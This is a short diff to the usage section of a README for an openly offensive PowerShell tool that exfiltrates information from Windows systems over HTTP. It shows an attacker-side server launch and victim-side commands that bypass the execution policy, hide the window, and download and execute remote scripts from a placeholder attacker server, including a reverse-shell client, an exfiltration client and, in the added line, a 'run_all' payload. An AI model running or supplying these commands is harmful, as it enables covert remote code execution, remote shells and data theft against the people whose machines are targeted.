@@ -15,4 +15,5 @@ A PowerShell script to exfiltrate information of a Windows system via HTTP serve
 ATTACKER> python3 server.py
 VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_rvs.ps1');"
 VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_exf.ps1');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/run_all');"
 ```
